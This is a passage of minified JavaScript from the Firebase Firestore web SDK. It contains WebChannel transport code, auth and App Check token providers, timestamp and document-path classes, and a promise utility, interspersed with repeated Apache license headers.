$=d.location;R=$.protocol,_=_?_+"."+$.hostname:$.hostname,$=+$.port;var ie=new an(null);R&&io(ie,R),_&&(ie.g=_),$&&ea(ie,$),x&&(ie.l=x),R=ie}return x=h.D,_=h.ya,x&&_&&It(R,x,_),It(R,"VER",h.la),ho(h,R),R}function gh(h,_,x){if(_&&!h.J)throw Error("Can't create secondary domain capable XhrIo object.");return _=h.Ca&&!h.pa?new Ct(new ta({eb:x})):new Ct(h.pa),_.Ha(h.J),_}t.isActive=function(){return!!this.l&&this.l.isActive(this)};function yh(){}t=yh.prototype,t.ua=function(){},t.ta=function(){},t.sa=function(){},t.ra=function(){},t.isActive=function(){return!0},t.Na=function(){};function yl(){}yl.prototype.g=function(h,_){return new ii(h,_)};function ii(h,_){bt.call(this),this.g=new fl(_),this.l=h,this.h=_&&_.messageUrlParams||null,h=_&&_.messageHeaders||null,_&&_.clientProtocolHeaderRequired&&(h?h["X-Client-Protocol"]="webchannel":h={"X-Client-Protocol":"webchannel"}),this.g.o=h,h=_&&_.initMessageHeaders||null,_&&_.messageContentType&&(h?h["X-WebChannel-Content-Type"]=_.messageContentType:h={"X-WebChannel-Content-Type":_.messageContentType}),_&&_.va&&(h?h["X-WebChannel-Client-Profile"]=_.va:h={"X-WebChannel-Client-Profile":_.va}),this.g.S=h,(h=_&&_.Sb)&&!Y(h)&&(this.g.m=h),this.v=_&&_.supportsCrossDomainXhr||!1,this.u=_&&_.sendRawJson||!1,(_=_&&_.httpSessionIdParam)&&!Y(_)&&(this.g.D=_,h=this.h,h!==null&&_ in h&&(h=this.h,_ in h&&delete h[_])),this.j=new Lr(this)}C(ii,bt),ii.prototype.m=function(){this.g.l=this.j,this.v&&(this.g.J=!0),this.g.connect(this.l,this.h||void 0)},ii.prototype.close=function(){Zc(this.g)},ii.prototype.o=function(h){var _=this.g;if(typeof h=="string"){var x={};x.__data__=h,h=x}else this.u&&(x={},x.__data__=Ai(h),h=x);_.i.push(new Ti(_.Ya++,h)),_.G==3&&pl(_)},ii.prototype.N=function(){this.g.l=null,delete this.j,Zc(this.g),delete this.g,ii.aa.N.call(this)};function vh(h){dr.call(this),h.__headers__&&(this.headers=h.__headers__,this.statusCode=h.__status__,delete h.__headers__,delete h.__status__);var _=h.__sm__;if(_){e:{for(const x in _){h=x;break e}h=void 0}(this.i=h)&&(h=this.i,_=_!==null&&h in _?_[h]:void 0),this.data=_}else this.data=h}C(vh,dr);function _h(){Xs.call(this),this.status=1}C(_h,Xs);function Lr(h){this.g=h}C(Lr,yh),Lr.prototype.ua=function(){We(this.g,"a")},Lr.prototype.ta=function(h){We(this.g,new vh(h))},Lr.prototype.sa=function(h){We(this.g,new _h)},Lr.prototype.ra=function(){We(this.g,"b")},yl.prototype.createWebChannel=yl.prototype.g,ii.prototype.send=ii.prototype.o,ii.prototype.open=ii.prototype.m,ii.prototype.close=ii.prototype.close,QC=function(){return new yl},YC=function(){return Rr()},GC=ei,P0={mb:0,pb:1,qb:2,Jb:3,Ob:4,Lb:5,Mb:6,Kb:7,Ib:8,Nb:9,PROXY:10,NOPROXY:11,Gb:12,Cb:13,Db:14,Bb:15,Eb:16,Fb:17,ib:18,hb:19,jb:20},Se.NO_ERROR=0,Se.TIMEOUT=8,Se.HTTP_ERROR=6,Lf=Se,Ve.COMPLETE="complete",qC=Ve,to.EventType=Hi,Hi.OPEN="a",Hi.CLOSE="b",Hi.ERROR="c",Hi.MESSAGE="d",bt.prototype.listen=bt.prototype.K,ed=to,Ct.prototype.listenOnce=Ct.prototype.L,Ct.prototype.getLastError=Ct.prototype.Ka,Ct.prototype.getLastErrorCode=Ct.prototype.Ba,Ct.prototype.getStatus=Ct.prototype.Z,Ct.prototype.getResponseJson=Ct.prototype.Oa,Ct.prototype.getResponseText=Ct.prototype.oa,Ct.prototype.send=Ct.prototype.ea,Ct.prototype.setWithCredentials=Ct.prototype.Ha,HC=Ct}).apply(typeof Ef<"u"?Ef:typeof self<"u"?self:typeof window<"u"?window:{});const Jx="@firebase/firestore",eA="4.7.16";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kn{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}Kn.UNAUTHENTICATED=new Kn(null),Kn.GOOGLE_CREDENTIALS=new Kn("google-credentials-uid"),Kn.FIRST_PARTY=new Kn("first-party-uid"),Kn.MOCK_USER=new Kn("mock-user");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let jc="11.8.1";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ho=new ip("@firebase/firestore");function Kl(){return Ho.logLevel}function xe(t,...e){if(Ho.logLevel<=ot.DEBUG){const n=e.map(e_);Ho.debug(`Firestore (${jc}): ${t}`,...n)}}function Vs(t,...e){if(Ho.logLevel<=ot.ERROR){const n=e.map(e_);Ho.error(`Firestore (${jc}): ${t}`,...n)}}function mc(t,...e){if(Ho.logLevel<=ot.WARN){const n=e.map(e_);Ho.warn(`Firestore (${jc}): ${t}`,...n)}}function e_(t){if(typeof t=="string")return t;try{/**
* @license
* Copyright 2020 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/return function(n){return JSON.stringify(n)}(t)}catch{return t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ze(t,e,n){let i="Unexpected state";typeof e=="string"?i=e:n=e,KC(t,i,n)}function KC(t,e,n){let i=`FIRESTORE (${jc}) INTERNAL ASSERTION FAILED: ${e} (ID: ${t.toString(16)})`;if(n!==void 0)try{i+=" CONTEXT: "+JSON.stringify(n)}catch{i+=" CONTEXT: "+n}throw Vs(i),new Error(i)}function St(t,e,n,i){let s="Unexpected state";typeof n=="string"?s=n:i=n,t||KC(e,s,i)}function Qe(t,e){return t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fe={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class ke extends Gs{constructor(e,n){super(e,n),this.code=e,this.message=n,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ps{constructor(){this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class WC{constructor(e,n){this.user=n,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class CP{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,n){e.enqueueRetryable(()=>n(Kn.UNAUTHENTICATED))}shutdown(){}}class SP{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,n){this.changeListener=n,e.enqueueRetryable(()=>n(this.token.user))}shutdown(){this.changeListener=null}}class NP{constructor(e){this.t=e,this.currentUser=Kn.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,n){St(this.o===void 0,42304);let i=this.i;const s=f=>this.i!==i?(i=this.i,n(f)):Promise.resolve();let o=new Ps;this.o=()=>{this.i++,this.currentUser=this.u(),o.resolve(),o=new Ps,e.enqueueRetryable(()=>s(this.currentUser))};const c=()=>{const f=o;e.enqueueRetryable(async()=>{await f.promise,await s(this.currentUser)})},d=f=>{xe("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=f,this.o&&(this.auth.addAuthTokenListener(this.o),c())};this.t.onInit(f=>d(f)),setTimeout(()=>{if(!this.auth){const f=this.t.getImmediate({optional:!0});f?d(f):(xe("FirebaseAuthCredentialsProvider","Auth not yet detected"),o.resolve(),o=new Ps)}},0),c()}getToken(){const e=this.i,n=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(n).then(i=>this.i!==e?(xe("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):i?(St(typeof i.accessToken=="string",31837,{l:i}),new WC(i.accessToken,this.currentUser)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return St(e===null||typeof e=="string",2055,{h:e}),new Kn(e)}}class RP{constructor(e,n,i){this.P=e,this.T=n,this.I=i,this.type="FirstParty",this.user=Kn.FIRST_PARTY,this.A=new Map}R(){return this.I?this.I():null}get headers(){this.A.set("X-Goog-AuthUser",this.P);const e=this.R();return e&&this.A.set("Authorization",e),this.T&&this.A.set("X-Goog-Iam-Authorization-Token",this.T),this.A}}class IP{constructor(e,n,i){this.P=e,this.T=n,this.I=i}getToken(){return Promise.resolve(new RP(this.P,this.T,this.I))}start(e,n){e.enqueueRetryable(()=>n(Kn.FIRST_PARTY))}shutdown(){}invalidateToken(){}}class tA{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class kP{constructor(e,n){this.V=n,this.forceRefresh=!1,this.appCheck=null,this.m=null,this.p=null,rr(e)&&e.settings.appCheckToken&&(this.p=e.settings.appCheckToken)}start(e,n){St(this.o===void 0,3512);const i=o=>{o.error!=null&&xe("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${o.error.message}`);const c=o.token!==this.m;return this.m=o.token,xe("FirebaseAppCheckTokenProvider",`Received ${c?"new":"existing"} token.`),c?n(o.token):Promise.resolve()};this.o=o=>{e.enqueueRetryable(()=>i(o))};const s=o=>{xe("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=o,this.o&&this.appCheck.addTokenListener(this.o)};this.V.onInit(o=>s(o)),setTimeout(()=>{if(!this.appCheck){const o=this.V.getImmediate({optional:!0});o?s(o):xe("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}},0)}getToken(){if(this.p)return Promise.resolve(new tA(this.p));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then(n=>n?(St(typeof n.token=="string",44558,{tokenResult:n}),this.m=n.token,new tA(n.token)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function DP(t){const e=typeof self<"u"&&(self.crypto||self.msCrypto),n=new Uint8Array(t);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(n);else for(let i=0;i<t;i++)n[i]=Math.floor(256*Math.random());return n}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function $C(){return new TextEncoder}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class XC{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=62*Math.floor(4.129032258064516);let i="";for(;i.length<20;){const s=DP(40);for(let o=0;o<s.length;++o)i.length<20&&s[o]<n&&(i+=e.charAt(s[o]%62))}return i}}function Xe(t,e){return t<e?-1:t>e?1:0}function j0(t,e){let n=0;for(;n<t.length&&n<e.length;){const i=t.codePointAt(n),s=e.codePointAt(n);if(i!==s){if(i<128&&s<128)return Xe(i,s);{const o=$C(),c=MP(o.encode(nA(t,n)),o.encode(nA(e,n)));return c!==0?c:Xe(i,s)}}n+=i>65535?2:1}return Xe(t.length,e.length)}function nA(t,e){return t.codePointAt(e)>65535?t.substring(e,e+2):t.substring(e,e+1)}function MP(t,e){for(let n=0;n<t.length&&n<e.length;++n)if(t[n]!==e[n])return Xe(t[n],e[n]);return Xe(t.length,e.length)}function pc(t,e,n){return t.length===e.length&&t.every((i,s)=>n(i,e[s]))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const iA=-62135596800,rA=1e6;class yn{static now(){return yn.fromMillis(Date.now())}static fromDate(e){return yn.fromMillis(e.getTime())}static fromMillis(e){const n=Math.floor(e/1e3),i=Math.floor((e-1e3*n)*rA);return new yn(n,i)}constructor(e,n){if(this.seconds=e,this.nanoseconds=n,n<0)throw new ke(fe.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+n);if(n>=1e9)throw new ke(fe.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+n);if(e<iA)throw new ke(fe.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new ke(fe.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/rA}_compareTo(e){return this.seconds===e.seconds?Xe(this.nanoseconds,e.nanoseconds):Xe(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){const e=this.seconds-iA;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ye{static fromTimestamp(e){return new Ye(e)}static min(){return new Ye(new yn(0,0))}static max(){return new Ye(new yn(253402300799,999999999))}constructor(e){this.timestamp=e}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const sA="__name__";class Gr{constructor(e,n,i){n===void 0?n=0:n>e.length&&ze(637,{offset:n,range:e.length}),i===void 0?i=e.length-n:i>e.length-n&&ze(1746,{length:i,range:e.length-n}),this.segments=e,this.offset=n,this.len=i}get length(){return this.len}isEqual(e){return Gr.comparator(this,e)===0}child(e){const n=this.segments.slice(this.offset,this.limit());return e instanceof Gr?e.forEach(i=>{n.push(i)}):n.push(e),this.construct(n)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let n=0;n<this.length;n++)if(this.get(n)!==e.get(n))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let n=0;n<this.length;n++)if(this.get(n)!==e.get(n))return!1;return!0}forEach(e){for(let n=this.offset,i=this.limit();n<i;n++)e(this.segments[n])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,n){const i=Math.min(e.length,n.length);for(let s=0;s<i;s++){const o=Gr.compareSegments(e.get(s),n.get(s));if(o!==0)return o}return Xe(e.length,n.length)}static compareSegments(e,n){const i=Gr.isNumericId(e),s=Gr.isNumericId(n);return i&&!s?-1:!i&&s?1:i&&s?Gr.extractNumericId(e).compare(Gr.extractNumericId(n)):j0(e,n)}static isNumericId(e){return e.startsWith("__id")&&e.endsWith("__")}static extractNumericId(e){return Pa.fromString(e.substring(4,e.length-2))}}class qt extends Gr{construct(e,n,i){return new qt(e,n,i)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const n=[];for(const i of e){if(i.indexOf("//")>=0)throw new ke(fe.INVALID_ARGUMENT,`Invalid segment (${i}). Paths must not contain // in them.`);n.push(...i.split("/").filter(s=>s.length>0))}return new qt(n)}static emptyPath(){return new qt([])}}const OP=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class Un extends Gr{construct(e,n,i){return new Un(e,n,i)}static isValidIdentifier(e){return OP.test(e)}canonicalString(){return this.toArray().map(e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),Un.isValidIdentifier(e)||(e="`"+e+"`"),e)).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)===sA}static keyField(){return new Un([sA])}static fromServerFormat(e){const n=[];let i="",s=0;const o=()=>{if(i.length===0)throw new ke(fe.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);n.push(i),i=""};let c=!1;for(;s<e.length;){const d=e[s];if(d==="\\"){if(s+1===e.length)throw new ke(fe.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const f=e[s+1];if(f!=="\\"&&f!=="."&&f!=="`")throw new ke(fe.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);i+=f,s+=2}else d==="`"?(c=!c,s++):d!=="."||c?(i+=d,s++):(o(),s++)}if(o(),c)throw new ke(fe.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new Un(n)}static emptyPath(){return new Un([])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Pe{constructor(e){this.path=e}static fromPath(e){return new Pe(qt.fromString(e))}static fromName(e){return new Pe(qt.fromString(e).popFirst(5))}static empty(){return new Pe(qt.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&qt.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,n){return qt.comparator(e.path,n.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Pe(new qt(e.slice()))}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _d=-1;function PP(t,e){const n=t.toTimestamp().seconds,i=t.toTimestamp().nanoseconds+1,s=Ye.fromTimestamp(i===1e9?new yn(n+1,0):new yn(n,i));return new Fa(s,Pe.empty(),e)}function jP(t){return new Fa(t.readTime,t.key,_d)}class Fa{constructor(e,n,i){this.readTime=e,this.documentKey=n,this.largestBatchId=i}static min(){return new Fa(Ye.min(),Pe.empty(),_d)}static max(){return new Fa(Ye.max(),Pe.empty(),_d)}}function LP(t,e){let n=t.readTime.compareTo(e.readTime);return n!==0?n:(n=Pe.comparator(t.documentKey,e.documentKey),n!==0?n:Xe(t.largestBatchId,e.largestBatchId))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const VP="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class UP{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach(e=>e())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Lc(t){if(t.code!==fe.FAILED_PRECONDITION||t.message!==VP)throw t;xe("LocalStore","Unexpectedly lost primary lease")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class de{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e(n=>{this.isDone=!0,this.result=n,this.nextCallback&&this.nextCallback(n)},n=>{this.isDone=!0,this.error=n,this.catchCallback&&this.catchCallback(n)})}catch(e){return this.next(void 0,e)}next(e,n){return this.callbackAttached&&ze(59440),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(n,this.error):this.wrapSuccess(e,this.result):new de((i,s)=>{this.nextCallback=o=>{this.wrapSuccess(e,o).next(i,s)},this.catchCallback=o=>{this.wrapFailure(n,o).next(i,s)}})}toPromise(){return new Promise((e,n)=>{this.next(e,n)})}wrapUserFunction(e){try{const n=e();return n instanceof de?n:de.resolve(n)}catch(n){return de.reject(n)}}wrapSuccess(e,n){return e?this.wrapUserFunction(()=>e(n)):de.resolve(n)}wrapFailure(e,n){return e?this.wrapUserFunction(()=>e(n)):de.reject(n)}static resolve(e){return new de((n,i)=>{n(e)})}static reject(e){return new de((n,i)=>{i(e)})}static waitFor(e){return new de((n,i)=>{let s=0,o=0,c=!1;e.forEach(d=>{++s,d.next(()=>{++o,c&&o===s&&n()},f=>i(f))}),c=!0,o===s&&n()})}static or(e){let n=de.resolve(!1);for(const i of e)n=n.next(s=>s?de.resolve(s):i());return n}static forEach(e,n){const i=[];return e.forEach((s,o)=>{i.push(n.call(this,s,o))}),this.waitFor(i)}static mapArray(e,n){return new de((i,s)=>{const o=e.length,c=new Array(o);let d=0;for(let f=0;f<o;f++){const p=f;n(e[p]).next(v=>{c[p]=v,++d,d===o&&i(c)},v=>s(v))}})}static doWhile(e,n){return new de((i,s)=>{const o=()=>{e()===!0?n().next(()=>{o()},s):i()};o()})}}function BP(t){const e=t.match(/Android ([\d.]+)/i),n=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(n)}function Vc(t){return t.name==="IndexedDbTransactionError"}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sp{constructor(e,n){this.previousValue=e,n&&(n.sequenceNumberHandler=i=>this.ue(i),this.ce=i=>n.writeSequenceNumber(i))}ue(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this.ce&&this.ce(e),e}}sp.le=-1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
